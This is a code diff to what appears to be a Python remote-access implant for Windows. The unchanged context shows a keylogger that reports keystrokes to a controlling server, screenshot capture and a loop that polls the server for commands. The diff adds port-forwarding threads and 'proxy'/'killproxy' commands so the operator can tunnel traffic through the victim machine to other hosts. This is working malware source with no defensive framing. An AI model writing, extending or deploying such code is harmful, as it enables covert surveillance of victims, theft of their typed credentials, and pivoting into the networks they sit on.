@@ -20,6 +20,58 @@ from PIL import Image
 
 import win32clipboard
 
+from threading import Thread
+
+class PortForwardOutboundLoop(Thread):
+	def __init__(self, daemon, targetHost, targetPort, remoteSocket):
+		# Call the Thread class's init function
+		Thread.__init__(self)
+		self.daemon = daemon
+		self.targetHost = targetHost
+		self.targetPort = targetPort
+		self.remoteSocket = remoteSocket
+		self.stayAlive = True;
+
+	def kill(self):
+		self.stayAlive = False;
+
+	def run(self):
+		while self.stayAlive:
+			forwardData = self.daemon.pollForward(self.targetHost + ":" + str(self.targetPort))
+			if forwardData:
+				self.remoteSocket.send(forwardData)
+			time.sleep(0.001)    
+                
+class PortForwardInboundLoop(Thread):
+	def __init__(self, daemon, targetHost, targetPort, remoteSocket):
+		# Call the Thread class's init function
+		Thread.__init__(self)
+		self.daemon = daemon
+		self.targetHost = targetHost
+		self.targetPort = targetPort
+		self.remoteSocket = remoteSocket
+		self.stayAlive = True;
+
+	def kill(self):
+		self.stayAlive = False;
+
+	def run(self):
+		while self.stayAlive:
+			# we set a 2 second timeout; depending on your
+			# target, this may need to be adjusted
+			self.remoteSocket.settimeout(2)
+			dummy = 0
+			try:
+				# keep reading into the buffer until
+				# there's no more data or we timeout
+
+				data = self.remoteSocket.recv(4096)
+				if data:
+					self.daemon.pushForward(self.targetHost + ":" + str(self.targetPort), data)
+			except Exception as e:
+				dummy=1#Do nothing
+				#print("Cannot connect {}".format(e), file=sys.stderr)        
+
 class Keylogger:
 	def __init__(self, interval, daemon, useScreenshot):
 		# we gonna pass SEND_REPORT_EVERY to interval
@@ -66,7 +118,6 @@ class Keylogger:
 			# if there is something in log, report it
 			self.end_dt = datetime.now()
 			# update `self.filename`
-			print("Have log: " + self.log)
 			self.daemon.postKeylogger(self.log)
 			# if you want to print in the console, uncomment below line
 			# print(f"[{self.filename}] - {self.log}")
@@ -89,6 +140,9 @@ class Keylogger:
 		self.report()
 
 class LocalAgent:
+	outboundLooperDict = {}
+	inboundLooperDict = {}
+
 	def takeScreenshot(self, postScreenshot):
 		image = pyautogui.screenshot()
 		im_file = BytesIO()
@@ -145,9 +199,45 @@ class LocalAgent:
 
 	def postResponse(self, cmd_output):
 		raise NotImplementedError("Please Implement this method")
-	
+
 	def pollServer(self):
 		raise NotImplementedError("Please Implement this method") 
+
+	def pollForward(self, forwardID):
+		raise NotImplementedError("Please Implement this method") 
+
+	def pushForward(self, forwardID, data):
+		raise NotImplementedError("Please Implement this method") 
+
+	def processNewForwardRequest(self, request):
+		elements = request.split(" ")
+		if(len(elements) != 4):
+			return "Invalid argument: need 'proxy <ip> <remote port> <forward port>'"
+
+		try:
+			port = int(elements[2])
+			remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			remote_socket.connect((elements[1], port))   
+			uidStr = elements[1] + ":" + elements[2]
+			self.outboundLooperDict[uidStr] = PortForwardOutboundLoop(self, elements[1], port, remote_socket)
+			self.outboundLooperDict.get(uidStr).start()
+			self.inboundLooperDict[uidStr] = PortForwardInboundLoop(self, elements[1], port, remote_socket)
+			self.inboundLooperDict.get(uidStr).start()
+		except Exception as e:
+			print("Cannot connect {}".format(e), file=sys.stderr)
+			self.postResponse("Cannot connect to specified host")    
+		self.postResponse("Proxy established")    
+		return None
+        
+	def processForwardRemove(self, request):
+		elements = request.split(" ")
+		if(len(elements) != 3):
+			return "Invalid argument: need 'killproxy <ip> <port>'"
+		uidStr = elements[1] + ":" + elements[2]    
+		if uidStr in self.outboundLooperDict:
+			self.outboundLooperDict.get(uidStr).kill()
+		if uidStr in self.inboundLooperDict:
+			self.inboundLooperDict.get(uidStr).kill()
     
 	def pollCommand(self):
 		response = self.pollServer()
@@ -187,6 +277,10 @@ class LocalAgent:
 			return None
 		elif response.startswith("ps"):
 			return "tasklist"
+		elif response.startswith("proxy"):
+			return self.processNewForwardRequest(response)
+		elif response.startswith("killproxy"):
+			return self.processForwardRemove(response)
 		elif response.startswith("cd "):
 			relative = response[len("cd "):]
 			try:
